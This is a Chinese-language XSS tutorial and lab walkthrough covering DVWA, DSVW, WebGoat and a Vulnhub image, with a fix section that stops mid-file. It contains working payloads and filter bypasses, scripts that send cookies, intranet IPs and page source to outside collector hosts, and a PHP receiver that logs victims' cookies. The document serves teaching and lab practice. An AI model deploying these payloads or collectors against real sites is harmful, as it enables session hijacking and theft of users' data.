# 1.XSS漏洞概述
## 1.1 漏洞简介
跨站脚本攻击—XSS（Cross Site Script），是指攻击者通过在Web页面中写入恶意脚本，造成用户在浏览页面时，控制用户浏览器进行操作的攻击方式。假设，在一个服务端上，有一处功能使用了这段代码，他的功能是将用户输入的内容输出到页面上，很常见的一个功能。但是假如，这里输入的内容是一段经过构造的js。那么在用户再次访问这个页面时，就会获取使用js在用户的浏览器端执行一个弹窗操作。通过构造其他相应的代码，攻击者可以执行更具危害的操作。

## 1.2 XSS漏洞原理
### 1.2.1 反射型
非持久型，常见的就是在URL中构造，将恶意链接发送给目标用户。当用户访问该链接时候，会向服务器发起一个GET请求来提交带有恶意代码的链接。造成反弹型XSS
主要是GET类型
### 1.2.2 存储型
持久型，常见的就是在博客留言板、反馈投诉、论坛评论、将恶意代码和正文都存入服务器的数据库。每次访问都会触发恶意代码。
例如：`<srcipt>alert(/xss/)</srcipt>`
### 1.2.3 DOM型
DOM型是特殊的反射型XSS
在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。

```
<script>var img=document.createElement("img");img.src="http://xxxx/a?"+escape(document.cookie);</script>
```
## 1.3 XSS危害
### 1.3.1 盗取管理员cookie
盗取管理员的cookie然后登陆后台，获取到后台权限。
### 1.3.2 XSS蠕虫攻击
可以构成几何的速度进行传播xss代码，获取大部分人的权限。一般配合csrf使用


## 1.4 常用XSS语句
```
<script>alert(/xss/);</script> //经典语句

<BODY ONLOAD=alert('XSS')>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<a href = javasript:alert(1)>
```

## 1.5 XSS漏洞绕过
### 1.5.1 JS编码
三个八进制数；如果不够前面补0
两个十六进制数字；如果不够前面补0
四个十六进制数字；如果不够前面补0
控制字符
### 1.5.2 HTML实体编码
以`&`开始`;`结束
### 1.5.3 URL编码
%27
考虑HTML的渲染方式选择合适的编码方式进行测试
## 1.6 XSS漏洞浏览器问题
有些浏览器会过滤掉一些js脚本，在测试的时候需要关闭对JavaScript的检测。
## 0x06 XSS漏洞防御
过滤输入的数据，和非法字符`‘ “ < > on* 等”’`
输出到页面的数据进行相应的编码转换包括HTML实体编码、JavaScript编码等

# 2. 测试方法
## 2.1 手工测试
这里我们选取DVWA靶场进行手工测试。
### 2.1.1
### 2.1.1.1 DVWA 简介
DVWA是用PHP+Mysql编写的一套用于常规WEB漏洞教学和检测的WEB脆弱性测试程序。包含了SQL注入、XSS、盲注等常见的一些安全漏洞。
#### 2.1.1.2 DVWA 安装

```
https://github.com/ethicalhack3r/DVWA/archive/master.zip
```
本地PHPStudy搭建DVWA靶机，放入www目录下即可
环境使用PHP+MySQL即可。

![image-20190811182129720](assets/image-20190811182129720.png)

修改config.inc.php.dist配置文件中的数据库密码，并且把文件后缀.dist去掉
![image-20190811182159111](assets/image-20190811182159111.png)

因为是xss实验，所以上面的红字可无视，重置一下数据库进入靶场
![image-20190811182222937](assets/image-20190811182222937.png)

用户名:admin 密码:password 登陆靶场
![image-20190811182237449](assets/image-20190811182237449.png)

默认的难度是impossible级别，先选择low级别
![image-20190811182246872](assets/image-20190811182246872.png)

#### 2.1.1.3 测试过程
** Low **
** Low_DOM XSS **
用`</option></select><img src=## onerror=alert(document.cookie)>`即可触发XSS
![image-20190811182257946](assets/image-20190811182257946.png)

** Low_Reflected XSS **
直接使用`<script>alert(document.cookie)</script>`
![image-20190811182322304](assets/image-20190811182322304.png)

** Low_Stored XSS **
![image-20190811182347247](assets/image-20190811182347247.png)
![在这里插入图片描述](assets/2019052622125879.png)

** Medium **
** Medium_DOM XSS **
从Medium级别就开始有加固
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70.png)

可以看到它先判断default是否为空，如果不为空，判断下面判断GET输入进来的变量default是否存在`<script`如果存在就重定向到?default=English
用之前low级别的代码就可以进行绕过

```
</option></select><img src=## onerror=alert(document.cookie)>
```
![在这里插入图片描述](assets/20190526221924845.png)

** Medium_Reflected XSS **
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182401868.png)

分析发现现实判断是否为空，如果不为空再判断其中的内容如果有`<script>`就替换成空复写就可以绕过

```
<sc<script>ript>alert(document.cookie)</script>
```

![在这里插入图片描述](assets/20190526222242350.png)

** Medium_Stored XSS **

![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182406597.png)

在信息框把所有的特殊字符都进行了addslashes转义，在name那块仍然可以用复写绕过、
但是name处限制了长度，改一下即可
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182408874.png)![image-20190811182633425](assets/image-20190811182633425.png)

![在这里插入图片描述](assets/20190526222812287.png)

** High **
** High_DOM XSS **
High级别的代码的限制就比较多，但是还能利用
![image-20190811182617469](assets/image-20190811182617469.png)

只能选择case后面的参数来提交，如果不是就按照默认English
构造语句，这里的##是URL的锚点，让浏览器判断这里终止，主要是让本地存储这个xss语句，发送到服务端进行验证的是##前面的内容，达到了绕过的目的

```
English##<script>alert(document.cookie)</script>
```
![在这里插入图片描述](assets/20190526223405803.png)

![在这里插入图片描述](assets/2019052622345756.png)

** High_Reflected XSS **
![image-20190811182604242](assets/image-20190811182604242.png)

上述代码进行了正则替换，只要包含script这些都会进行替换，不使用script即可

```
<img src=1 onerror=alert(document.cookie)>
```
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182433041.png)

** High_Stored XSS **
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182434800.png)

跟上面同理，在name处进行xss，仍然需要改name长度
![image-20190811182548864](assets/image-20190811182548864.png)

** Impossible **
Impossible级别利用失败
![在这里插入图片描述](assets/20190526224033290.png)

## 无敌防御方法使用htmlspecialchars函数对输入的数据实例化，失去本身作用。

### 2.1.2 DSVW
#### 2.1.2.1 DSVW 简介
Damn Small Vulnerable Web (DSVW) 是使用 Python 语言开发的 Web应用漏洞 的演练系统。其系统只有一个 python 的脚本文件组成, 当中涵盖了 26 种 Web应用漏洞环境, 并且脚本代码行数控制在了100行以内, 当前版本v0.1m。需要python (2.6.x 或 2.7)并且得安装lxml库
#### 2.1.2.2 DSVW 安装
安装python-lxml，再下载DSVW
```
apt-get install python-lxml
git clone https://github.com/stamparm/DSVW.git
```
直接运行
![在这里插入图片描述](assets/20190527122236280.png)![在这里插入图片描述](assets/20190527122253950.png)

如果出现ip无法访问的情况改一下代码即可
![在这里插入图片描述](assets/20190527122505965.png)

#### 2.1.2.3 测试过程
** XSS(Reflected) **
因为这个网站没有cookie，所以直接弹射信息
代码`<script>alert(/xss aixi/)</script>`
![在这里插入图片描述](assets/2019052712275240.png)

** XSS(Stored) **
http://10.1.1.14:65412/?comment=%3Cscript%3Ealert(/xss%20aixi/)%3C/script%3E
代码`<script>alert(/xss aixi/)</script>`
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182919600.png)

直接弹射

** XSS(DOM) **
?##lang=`<script>alert(/xss%20aixi/)</script>`
![在这里插入图片描述](assets/20190527123135347.png)

直接弹射

** XSS(JSON) **
![在这里插入图片描述](assets/20190527123457465.png)

![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182926099.png)

看代码可发现
构造语句alert(/xss/)即可不用带script
![在这里插入图片描述](assets/20190527124432748.png)


## 2.2 工具测试
因为要测试所以需要关闭DVWA的登陆验证
加上$dvwaSession[ 'username' ]='admin';
![在这里插入图片描述](assets/20190527104524838.png)
在config/config.inc.php把默认难度也改成low
![在这里插入图片描述](assets/20190527104850118.png)

### 2.2.1 BruteXSS
下载链接
```
https://github.com/ym2011/penetration/tree/master/BruteXSS
```
![image-20190811182510256](assets/image-20190811182510256.png)
![image-20190811182520926](assets/image-20190811182520926.png)

测试过程中会因为DVWA的cookie验证严格出现问题，把dvwa的代码进行本地测试利用即可
![image-20190811182720820](assets/image-20190811182720820.png)

### 2.2.2 xxser
Kali自带或下载链接

```
在基于Debian的系统上安装

sudo apt-get install python-pycurl python-xmlbuilder python-beautifulsoup python-geoip 使用
```

![在这里插入图片描述](assets/20190527112426411.png)

利用成功

![image-20190811182735813](assets/image-20190811182735813.png)

## 2.3 XSS平台搭建

### 2.3.1 平台介绍
XSS平台可以辅助安全测试人员对XSS相关的漏洞危害进行深入学习，了解XSS的危害重视XSS的危害，如果要说XSS可以做哪些事情，XSS可以做js能够做的所有事情。包括但不限于：窃取Cookie、后台增删改文章、钓鱼、利用XSS漏洞进行传播、修改网页代码、网站重定向、获取用户信息（如浏览器信息，IP地址等）等。
XSS平台项目名称：BlueLotus_XSSReceiver
作者：firesun（来自清华大学蓝莲花战队）
项目地址：https://github.com/firesunCN/BlueLotus_XSSReceiver

### 2.3.2 平台环境
服务器操作系统：ubuntu14
web容器：Apache2
脚本语言：PHP7
安装http server与php环境（ubuntu: sudo apt-get install apache2 php5 或 sudo apt-get install apache2 php7.0 libapache2-mod-php7.0）
### 2.3.3 平台部署
文件解压到www根目录
然后给个权限，为了防止出错
![在这里插入图片描述](assets/20190527221135272.png)
权限的问题已经解决了
![在这里插入图片描述](assets/20190527221208135.png)
打开网页访问admin.php进行自动部署，点击安装
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183247361.png)
设置一下后台登陆密码
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183249868.png)
点击下一步，部署成功![image-20190811182654820](assets/image-20190811182654820.png)

### 2.3.4 平台使用
登陆平台，在公共模版处使用默认js来进行
修改一下网站的地址
![image-20190811182647714](assets/image-20190811182647714.png)
改成这样即可
![在这里插入图片描述](assets/2019052722201120.png)
点击下面的修改即可成功应用
![在这里插入图片描述](assets/20190527222046379.png)
下面开始使用这个默认的JS脚本进行XSS，复制一下js地址`https://aixic.cn/XXXSSS/template/default.js`
![image-20190811182752409](assets/image-20190811182752409.png)
在DVWA中插入试试

```
<sCRiPt sRC=https://aixic.cn/XXXSSS/template/default.js></sCrIpT>
```

![image-20190811182809792](assets/image-20190811182809792.png)
能成功反射cookie

![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182812685.png)
### 2.3.5 平台扩展
#### 2.3.5.1 XSS平台反射注入
介绍一个之前在比赛看见有个师傅玩的操作，用xss进行内网SQL注入。ps:虽然他x错地方了而且跟注入没关系，但是看着挺好玩的，进行了一个简单的布尔判断xss
```
xmlhttp=new XMLHttpRequest();
var d1=new Date();
t1=d1.getTime();
xmlhttp.onreadystatechange=function(){
if(xmlhttp.readyState==4 && xmlhttp.status==200){
var d2=new Date();
t2=d2.getTime();
location.href="http://123.207.99.17/id1?xssaaaa"+escape(xmlhttp.responseText)+"timeCost"+String(t2-t1);
}
}
xmlhttp.open("POST","/Ze02pQYLf5gGNyMn/login.php",true);
xmlhttp.send("username=admi/**/or/**/1&password=1");
```

#### 2.3.5.2 使用邮件提醒
设置一下config.php里的与邮件相关的

![在这里插入图片描述](assets/20190527223054717.png)
### 直接去别的XSS平台去扒他们的脚本，拿来就能用
如这个获取内网IP的脚本
```
  var RTCPeerConnection = window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
if (RTCPeerConnection) (function() {
    var rtc = new RTCPeerConnection({
        iceServers:[]
    });
    if (1 || window.mozRTCPeerConnection) {
        rtc.createDataChannel("", {
            reliable:false
        });
    }
    rtc.onicecandidate = function(evt) {
        if (evt.candidate) grepSDP("a=" + evt.candidate.candidate);
    };
    rtc.createOffer(function(offerDesc) {
        grepSDP(offerDesc.sdp);
        rtc.setLocalDescription(offerDesc);
    }, function(e) {
        console.warn("offer failed", e);
    });
    var addrs = Object.create(null);
    addrs["0.0.0.0"] = false;
    function updateDisplay(newAddr) {
        if (newAddr in addrs) return; else addrs[newAddr] = true;
        var displayAddrs = Object.keys(addrs).filter(function(k) {
            return addrs[k];
        });
new Image().src="https://xsshs.cn/xss.php?do=selfxss&act=g&id={projectId}&c=!!!cookie:"+document.cookie+"!!!ip:"+String(displayAddrs);

    }
    function grepSDP(sdp) {
        var hosts = [];
        sdp.split("\r\n").forEach(function(line) {
            if (~line.indexOf("a=candidate")) {
                var parts = line.split(" "), addr = parts[4], type = parts[7];
                if (type === "host") updateDisplay(addr);
            } else if (~line.indexOf("c=")) {
                var parts = line.split(" "), addr = parts[2];
                updateDisplay(addr);
            }
        });
    }
})(); 
```
获取页面源码的脚本

```
var cr;
if (document.charset) {
  cr = document.charset
} else if (document.characterSet) {
  cr = document.characterSet
};
function createXmlHttp() {
  if (window.XMLHttpRequest) {
    xmlHttp = new XMLHttpRequest()
  } else {
    var MSXML = new Array('MSXML2.XMLHTTP.5.0', 'MSXML2.XMLHTTP.4.0', 'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP', 'Microsoft.XMLHTTP');
    for (var n = 0; n < MSXML.length; n++) {
      try {
        xmlHttp = new ActiveXObject(MSXML[n]);
        break
      } catch (e) {
      }
    }
  }
}
createXmlHttp();
xmlHttp.onreadystatechange = writeSource;
xmlHttp.open('GET', '{set.filename}', true);
xmlHttp.send(null);
function writeSource() {
  if (xmlHttp.readyState == 4) {
      var code = BASE64.encoder(xmlHttp.responseText);
      xssPost('https://xsshs.cn/xss.php?do=api&id={projectId}', code);
  }
}

  function xssPost(url, postStr) {
    var de;
    de = document.body.appendChild(document.createElement('iframe'));
    de.src = 'about:blank';
    de.height = 1;
    de.width = 1;
    de.contentDocument.write('<form method="POST" action="' + url + '"><input name="code" value="' + postStr + '"/></form>');
    de.contentDocument.forms[0].submit();
    de.style.display = 'none';
}
/**
 *create by 2012-08-25 pm 17:48
 *@author hexinglun@gmail.com
 *BASE64 Encode and Decode By UTF-8 unicode
 *可以和java的BASE64编码和解码互相转化
 */
(function(){
    var BASE64_MAPPING = [
    'A','B','C','D','E','F','G','H',
    'I','J','K','L','M','N','O','P',
    'Q','R','S','T','U','V','W','X',
    'Y','Z','a','b','c','d','e','f',
    'g','h','i','j','k','l','m','n',
    'o','p','q','r','s','t','u','v',
    'w','x','y','z','0','1','2','3',
    '4','5','6','7','8','9','+','/'
  ];

  /**
   *ascii convert to binary
   */
  var _toBinary = function(ascii){
    var binary = new Array();
    while(ascii > 0){
      var b = ascii%2;
      ascii = Math.floor(ascii/2);
      binary.push(b);
    }
    /*
    var len = binary.length;
    if(6-len > 0){
      for(var i = 6-len ; i > 0 ; --i){
        binary.push(0);
      }
    }*/
    binary.reverse();
    return binary;
  };

  /**
   *binary convert to decimal
   */
  var _toDecimal  = function(binary){
    var dec = 0;
    var p = 0;
    for(var i = binary.length-1 ; i >= 0 ; --i){
      var b = binary[i];
      if(b == 1){
        dec += Math.pow(2 , p);
      }
      ++p;
    }
    return dec;
  };

  /**
   *unicode convert to utf-8
   */
  var _toUTF8Binary = function(c , binaryArray){
    var mustLen = (8-(c+1)) + ((c-1)*6);
    var fatLen = binaryArray.length;
    var diff = mustLen - fatLen;
    while(--diff >= 0){
      binaryArray.unshift(0);
    }
    var binary = [];
    var _c = c;
    while(--_c >= 0){
      binary.push(1);
    }
    binary.push(0);
    var i = 0 , len = 8 - (c+1);
    for(; i < len ; ++i){
      binary.push(binaryArray[i]);
    }

    for(var j = 0 ; j < c-1 ; ++j){
      binary.push(1);
      binary.push(0);
      var sum = 6;
      while(--sum >= 0){
        binary.push(binaryArray[i++]);
      }
    }
    return binary;
  };

  var __BASE64 = {
      /**
       *BASE64 Encode
       */
      encoder:function(str){
        var base64_Index = [];
        var binaryArray = [];
        for(var i = 0 , len = str.length ; i < len ; ++i){
          var unicode = str.charCodeAt(i);
          var _tmpBinary = _toBinary(unicode);
          if(unicode < 0x80){
            var _tmpdiff = 8 - _tmpBinary.length;
            while(--_tmpdiff >= 0){
              _tmpBinary.unshift(0);
            }
            binaryArray = binaryArray.concat(_tmpBinary);
          }else if(unicode >= 0x80 && unicode <= 0x7FF){
            binaryArray = binaryArray.concat(_toUTF8Binary(2 , _tmpBinary));
          }else if(unicode >= 0x800 && unicode <= 0xFFFF){//UTF-8 3byte
            binaryArray = binaryArray.concat(_toUTF8Binary(3 , _tmpBinary));
          }else if(unicode >= 0x10000 && unicode <= 0x1FFFFF){//UTF-8 4byte
            binaryArray = binaryArray.concat(_toUTF8Binary(4 , _tmpBinary));  
          }else if(unicode >= 0x200000 && unicode <= 0x3FFFFFF){//UTF-8 5byte
            binaryArray = binaryArray.concat(_toUTF8Binary(5 , _tmpBinary));
          }else if(unicode >= 4000000 && unicode <= 0x7FFFFFFF){//UTF-8 6byte
            binaryArray = binaryArray.concat(_toUTF8Binary(6 , _tmpBinary));
          }
        }

        var extra_Zero_Count = 0;
        for(var i = 0 , len = binaryArray.length ; i < len ; i+=6){
          var diff = (i+6)-len;
          if(diff == 2){
            extra_Zero_Count = 2;
          }else if(diff == 4){
            extra_Zero_Count = 4;
          }
          //if(extra_Zero_Count > 0){
          //  len += extra_Zero_Count+1;
          //}
          var _tmpExtra_Zero_Count = extra_Zero_Count;
          while(--_tmpExtra_Zero_Count >= 0){
            binaryArray.push(0);
          }
          base64_Index.push(_toDecimal(binaryArray.slice(i , i+6)));
        }

        var base64 = '';
        for(var i = 0 , len = base64_Index.length ; i < len ; ++i){
          base64 += BASE64_MAPPING[base64_Index[i]];
        }

        for(var i = 0 , len = extra_Zero_Count/2 ; i < len ; ++i){
          base64 += '=';
        }
        return base64;
      },
      /**
       *BASE64  Decode for UTF-8 
       */
      decoder : function(_base64Str){
        var _len = _base64Str.length;
        var extra_Zero_Count = 0;
        /**
         *计算在进行BASE64编码的时候，补了几个0
         */
        if(_base64Str.charAt(_len-1) == '='){
          //alert(_base64Str.charAt(_len-1));
          //alert(_base64Str.charAt(_len-2));
          if(_base64Str.charAt(_len-2) == '='){//两个等号说明补了4个0
            extra_Zero_Count = 4;
            _base64Str = _base64Str.substring(0 , _len-2);
          }else{//一个等号说明补了2个0
            extra_Zero_Count = 2;
            _base64Str = _base64Str.substring(0 , _len - 1);
          }
        }

        var binaryArray = [];
        for(var i = 0 , len = _base64Str.length; i < len ; ++i){
          var c = _base64Str.charAt(i);
          for(var j = 0 , size = BASE64_MAPPING.length ; j < size ; ++j){
            if(c == BASE64_MAPPING[j]){
              var _tmp = _toBinary(j);
              /*不足6位的补0*/
              var _tmpLen = _tmp.length;
              if(6-_tmpLen > 0){
                for(var k = 6-_tmpLen ; k > 0 ; --k){
                  _tmp.unshift(0);
                }
              }
              binaryArray = binaryArray.concat(_tmp);
              break;
            }
          }
        }

        if(extra_Zero_Count > 0){
          binaryArray = binaryArray.slice(0 , binaryArray.length - extra_Zero_Count);
        }

        var unicode = [];
        var unicodeBinary = [];
        for(var i = 0 , len = binaryArray.length ; i < len ; ){
          if(binaryArray[i] == 0){
            unicode=unicode.concat(_toDecimal(binaryArray.slice(i,i+8)));
            i += 8;
          }else{
            var sum = 0;
            while(i < len){
              if(binaryArray[i] == 1){
                ++sum;
              }else{
                break;
              }
              ++i;
            }
            unicodeBinary = unicodeBinary.concat(binaryArray.slice(i+1 , i+8-sum));
            i += 8 - sum;
            while(sum > 1){
              unicodeBinary = unicodeBinary.concat(binaryArray.slice(i+2 , i+8));
              i += 8;
              --sum;
            }
            unicode = unicode.concat(_toDecimal(unicodeBinary));
            unicodeBinary = [];
          }
        }
        return unicode;
      }
  };

  window.BASE64 = __BASE64;
})();
```

## 2.4 简易xss平台搭建
JS脚本
```
var img = document.createElement("img");
img.src = "http://xxx/x.php?cookie="+document.cookie;
document.body.appendChild(img);
```
接收端

```
<?php  
$victim = 'XXS得到的 cookie:'. $_SERVER['REMOTE_ADDR']. ':' .$_GET['cookie']."\r\n\r\n";  
echo htmlspecialchars($_GET['cookie']);
$myfile = fopen("/aixi/XSS/xss_victim.txt", "a");
fwrite($myfile, $victim);
?>
```
![在这里插入图片描述](assets/20190527220829688.png)

## 2.5 WebGoat 简介
WebGoat是OWASP组织研制出的用于进行web漏洞实验的Java靶场程序，用来说明web应用中存在的安全漏洞。WebGoat运行在带有java虚拟机的平台之上，当前提供的训练课程有30多个，其中包括：跨站点脚本攻击（XSS）、访问控制、线程安全、操作隐藏字段、操纵参数、弱会话cookie、SQL盲注、数字型SQL注入、字符串型SQL注入、web服务、Open Authentication失效、危险的HTML注释等等。
## 2.5.1 WebGoat 安装
```
https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M25/webgoat-server-8.0.0.M25.jar
https://github.com/WebGoat/WebGoat/releases/download/v8.0.0.M25/webwolf-8.0.0.M25.jar
```
![在这里插入图片描述](assets/20190526224806456.png)
默认是127.0.0.1 ，只能本机访问，需要更改
 java -jar webgoat-server-8.0.0.M25.jar --server.address=0.0.0.0
![image-20190811182840741](assets/image-20190811182840741.png)
需更新到最新的java版本

```
https://www.oracle.com/technetwork/java/javase/downloads/jdk12-downloads-5295953.html
```
安装java步骤省略，安装好了开始运行
![在这里插入图片描述](assets/20190526230212918.png)
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182846515.png)
访问http://192.168.123.25:8080/WebGoat

## 2.5.2 测试过程
## 2.5.2.1 XSS(DOM)

## 第一个
攻击语句`<script>alert(document.cookie)</script>`
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182849165.png)

## 第二个
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182853739.png)
去找js脚本看里面的内容。
![在这里插入图片描述](assets/20190527100043351.png)
输入![在这里插入图片描述](https://img-blog.csdnimg.cn/20190527100009167.png)

## 第三个
结合上一个题的东西路径+基本参数构成
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182857497.png)
攻击语句`start.mvc##test/<script>alert(document.cookie)`,经过测试发现如果输入`<script>`他会自己补全，所以就不用输入`</script>`![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182900028.png)

## 2.5.2.2 XSS(Stored)
攻击代码`<script>alert(document.cookie)</script>`，直接留言板插入即可没有过滤
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182902485.png)
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182904381.png)


3. 真实实战演练

## 3.1 Vulnhub 简介
Vulnhub是一个提供各种漏洞环境的靶场平台，供安全爱好者学习渗透使用，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标。
## 3.2 Vulnhub 安装
这里下载关于xss的(下载32位的，以后可以用来做溢出攻击)
```
https://download.vulnhub.com/pentesterlab/xss_and_mysql_file_i386.iso
```
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811182932583.png)
打开VMware经典模式挂上镜像一直下一步，选择桥接模式就能自动分配一个IP地址

![在这里插入图片描述](assets/20190527125708648.png)
![image-20190811182957153](assets/image-20190811182957153.png)
安装成功

## 3.3 Vulnhub 漏洞介绍
本练习说明如何使用跨站点脚本漏洞来访问管理员的cookie。然后，您将如何使用他/她的会话来访问管理以查找SQL注入并使用它来获取代码执行。这个靶场主要是做一个xss反射
用户名admin 密码P4ssw0rd
## 3.4 Vulnhub 漏洞演示
![image-20190811183006531](assets/image-20190811183006531.png)
直接点留言
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183010680.png)
![在这里插入图片描述](assets/20190527130131793.png)
成功，因为是真实环境，我们这里直接用xss平台搞
![在这里插入图片描述](assets/20190527130334326.png)
管理员查看留言板触发xss
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183015819.png)
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183018204.png)
即可成功冒充用户登录
![在这里插入图片描述](assets/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0FpeGl4eHg=,size_16,color_FFFFFF,t_70-20190811183021525.png)

## 3.5 Vulnhub 漏洞修复
对输入处进行实例化，是最有效最简单的方法，如果是替换代码，量就比较大
![image-20190811183033796](assets/image-20190811183033796.png)
实例化classes/post.php

```
<?php

class Post{
  public $id, $title, $text, $published;
  function __construct($id, $title, $text, $published){
    $this->title= $title;
    $this->text = $text;
    $this->published= $published;
    $this->id = $id;
  }   

 
  function all($cat=NULL,$order =NULL) {
    $sql = "SELECT * FROM posts";
    if (isset($order)) 
      $sql .= "order by ".mysql_real_escape_string($order);  
    $results= mysql_query($sql);
    $posts = Array();
    if ($results) {
      while ($row = mysql_fetch_assoc($results)) {
        $posts[] = new Post($row['id'],$row['title'],$row['text'],$row['published']);
      }
    }
    else {
      echo mysql_error();
    }
    return $posts;
  }
 

  function render_all($pics) {
    echo "<ul>\n";
    foreach ($pics as $pic) {
      echo "\t<li>".$pic->render()."</a></li>\n";
    }
    echo "</ul>\n";
  }
 function render_edit() {
    $str = "<img src=\"uploads/".h($this->img)."\" alt=\"".h($this->title)."\" />";
    return $str;
  } 
  

  function render() {
    $str = "<h2 class=\"title\"><a href=\"/post.php?id=".h($this->id)."\">".h($this->title)."</a></h2>";
    $str.= '<div class="inner" align="center">';
    $str.= "<p>".htmlentities($this->text)."</p></div>";   
    $str.= "<p><a href=\"/post.php?id=".h($this->id)."\">";
    $count = $this->get_comments_count();
    switch ($count) {
    case 0:
        $str.= "Be the first to comment";
        break;
    case 1:
        $str.= "1 comment";
        break;
    case 2:
        $str.= $count." comments";
        break;
    }    
    $str.= "</a></p>";
    return $str;
  }
  function add_comment() {
    $sql  = "INSERT INTO comments (title,author, text, post_id) values ('";
    $sql .= mysql_real_escape_string(htmlspecialchars($_POST["title"]))."','";
    $sql .= mysql_real_escape_string(htmlspecialchars($_POST["author"]))."','";
    $sql .= mysql_real_escape_string(htmlspecialchars($_POST["text"]))."',";
    $sql .= intval($this->id).")";
    $result = mysql_query($sql);
    echo mysql_error(); 
  } 
  function render_with_comments() {
    $str = "<h2 class=\"title\"><a href=\"/post.php?id=".h($this->id)."\">".h($this->title)."</a></h2>";
    $str.= '<div class="inner" style="padding-left: 40px;">';
    $str.= "<p>".htmlentities($this->text)."</p></div>";   
    $str.= "\n\n<div class='comments'><h3>Comments: </h3>\n<ul>";
    foreach ($this->get_comments() as $comment) {
      $str.= "\n\t<li>".$comment->text."</li>";
    }
    $str.= "\n</ul></div>";
    return $str;
  }

  function get_comments_count() {
